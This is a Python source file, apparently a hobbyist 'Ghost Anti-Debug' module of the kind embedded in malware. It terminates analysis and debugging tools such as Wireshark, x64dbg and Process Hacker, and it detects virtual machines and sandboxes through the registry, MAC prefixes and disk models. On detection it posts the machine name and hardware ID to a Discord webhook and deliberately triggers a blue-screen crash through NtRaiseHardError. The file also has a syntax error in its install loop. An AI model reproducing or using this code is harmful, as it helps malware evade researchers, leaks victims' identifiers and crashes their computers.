# Made by Hisako
# Thanks to Stackoverflow / other peoples 
import subprocess
import threading
import requests
import random
import socket
import ctypes
import psutil
import time
import sys
import wmi
import os
import re

import logging
import hashlib

logging.basicConfig(filename='ghost-antidebug.log', level=logging.INFO)

modules = ["subprocess", "threading", "requests", "random", "socket", "ctypes", "psutil", "time", "sys", "wmi", "os", "re"]

for module in modules:
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", module])



# Imports for blue screen
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref

def Title(title):
    Tutle = title.encode('cp1252')
    ctypes.windll.kernel32.SetConsoleTitleA(Tutle)

def processtrigger():
    PROCESSES = [
        "http toolkit.exe",
        "httpdebuggerui.exe",
        "wireshark.exe",
        "fiddler.exe",
        "charles.exe",
        "regedit.exe",
        "de4py.exe",
        "vboxservice.exe",
        "df5serv.exe",
        "processhacker.exe",
        "vboxtray.exe",
        "vmtoolsd.exe",
        "vmwaretray.exe",
        "ida64.exe",
        "ollydbg.exe",
        "pestudio.exe",
        "vmwareuser",
        "vgauthservice.exe",
        "vmacthlp.exe",
        "x96dbg.exe",
        "vmsrvc.exe",
        "x32dbg.exe",
        "vmusrvc.exe",
        "prl_cc.exe",
        "prl_tools.exe",
        "qemu-ga.exe",
        "joeboxcontrol.exe",
        "ksdumperclient.exe",
        "ksdumper.exe",
        "joeboxserver.exe",
        "xenservice.exe",
        "procmon.exe",
        "apimonitor.exe",
        "cheatengine.exe",
        "ollyice.exe",
        "immunitydebugger.exe",
        "x64dbg.exe",
        "dnspy.exe",
        "ilspy.exe",
        "reflector.exe",
        "justdecompile.exe",
        "dotpeek.exe", # Somes of them are kinda useless
    ]
    for proc in psutil.process_iter(['name', 'pid', 'create_time']):
        try:
            if any(procstr in proc.info['name'].lower() for procstr in PROCESSES):
                parent = psutil.Process(proc.info['pid'])
                if parent.name() not in ['python.exe', 'pythonw.exe']:
                    proc.kill()
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass

def nowayulikedicks():
    if ctypes.windll.kernel32.IsDebuggerPresent():
        return True
    else:
        return False

def CheckDebug():
    if ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), ctypes.c_int(0)):
        return True
    else:
        return False

def TimingCheck():
    StartTime = time.time()
    for _ in range(10000):
        pass
    EndTime = time.time()
    return EndTime - StartTime > 0.1 

def ExceptionPatronium():
    try:
        raise ValueError("Trigger exception")
    except ValueError:
        return False
    except Exception as e:
        return True

def CheckForAVM2():
    try:
        sys_info = subprocess.check_output("systeminfo", shell=True).decode()
        if re.search(r"VMware|VirtualBox", sys_info, re.IGNORECASE):
            return True
    except Exception:
        pass

    try:
        MacInfo = subprocess.check_output("ipconfig /all", shell=True).decode()
        if re.search(r"00-50-56|00-0C-29|00-05-69|08-00-27", MacInfo):
            return True
    except Exception:
        pass

def CheckVmViaRegistry():
    try:
        import winreg
        reg_path = r"SYSTEM\ControlSet001\Services\Disk\Enum"
        reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_READ)
        value, _ = winreg.QueryValueEx(reg_key, "0")
        if "vmware" in value.lower() or "virtual" in value.lower():
            return True
    except Exception:
        pass
    return False

def CheckViaFiles():
    VmFiles = [
        "C:\\windows\\system32\\drivers\\VBoxMouse.sys",
        "C:\\windows\\system32\\drivers\\vm3dgl.dll",
        "/usr/bin/vmware", "/usr/bin/vbox"
    ]
    return any(os.path.exists(file) for file in VmFiles)    

def CheckVmViaProcess():
    try:
        processes = subprocess.check_output("tasklist", shell=True).decode()
        if re.search(r"vmtoolsd.exe|vmwaretray.exe", processes):
            return True
    except Exception:
        pass
    return False    

def CheckVMViaDMI():
    try:
        DmiData = subprocess.check_output("dmidecode", shell=True).decode()
        if re.search(r"VMware|VirtualBox", DmiData, re.IGNORECASE):
            return True
    except Exception:
        pass
    return False

def CheckForAVM():
    return (CheckVmViaRegistry() or CheckViaFiles() or
            CheckVmViaProcess() or CheckVMViaDMI() or
            CheckForAVM2())

def get_thing():
    wmi_obj = wmi.WMI()
    hwid = ""
    for item in wmi_obj.Win32_Processor():
        hwid += item.ProcessorId
    for item in wmi_obj.Win32_BaseBoard():
        hwid += item.SerialNumber
    return hwid


def TriageCheck():
    try:
        result = subprocess.check_output(['wmic', 'diskdrive', 'get', 'model'], text=True)
        if "DADY HARDDISK" in result or "QEMU HARDDISK" in result:
            return True
    except subprocess.CalledProcessError as e:
        print(f"Error running wmic command: {e}")
        return False
    
    return False

def check_connection():
    try:
        socket.create_connection(("google.com", 80), timeout=5)
        return True, None
    except socket.error as ex:
        error_message = f"Error checking internet connection: {ex}"
        print(f"[DEBUG] {error_message}")
        return False, Exception(error_message)


def checkblacklist(hwid):
    hwidlist = "https://pastebin.com/raw/uwubakasussy1234" # Pastebin Link
    response = requests.get(hwidlist)
    blacklisted = response.text.splitlines()
    return hwid in blacklisted

def WhatToDo(debugTypes):
    print(f"Debugger Detected ({debugTypes})")
    One = "https://discord.com/api/webhooks/"
    Two = ""
    Cipolle = ""
    message = {
        "content": f"Debugger detected on {os.getenv('COMPUTERNAME')} with HWID : {get_thing()} | What Detected? : ({debugTypes})",
        "username": "Ghost | Anti-Debug",
        "avatar_url": "https://i.pinimg.com/originals/20/b4/7d/20b47d52459f1509a19174f8eb6a42a1.jpg"
    }
    requests.post(f"{One}/{Two}/{Cipolle}", json=message)
    
    # Blue Screen trigger
    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),
        c_uint(1),
        c_uint(0),
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B),
        c_ulong(0),
    nullptr,
        nullptr,
        c_uint(6),
        byref(c_uint())
    )

# Starting checks
if __name__ == '__main__':
    threading.Thread(target=processtrigger, daemon=True).start()    

    Title("Ghost | Anti-Debug")
    debugTypes = []
    if nowayulikedicks():
        debugTypes.append("IsDebuggerPresent")
    if CheckDebug():
        debugTypes.append("CheckRemoteDebuggerPresent")
    if TimingCheck():
        debugTypes.append("TimingCheck")
    if ExceptionPatronium():
        debugTypes.append("ExceptionPatronium")

    hwid = get_thing()
    if checkblacklist(hwid):
        print(f"HWID : {hwid} is blacklisted. Exiting.")
        sys.exit(1)

    if TriageCheck():
        WhatToDo("TriageCheck detected")
    else:
        print("\033[92mNo Triage detected.\033[0m")

    connected, error = check_connection()
    if not connected:
        print(f"Error: {error}")
        sys.exit(1)

    if debugTypes:
        WhatToDo(", ".join(debugTypes))
    else:
        print("\033[92mNo debugger detected.\033[0m")

    if CheckForAVM():
        WhatToDo("VM detected")
    else:
        print("\033[92mNo VM detected. Continue with normal execution.\033[0m")
        
    print("\033[92mPassed! | Ghost-Antidebug (Made By Hisako) <3 \033[0m")
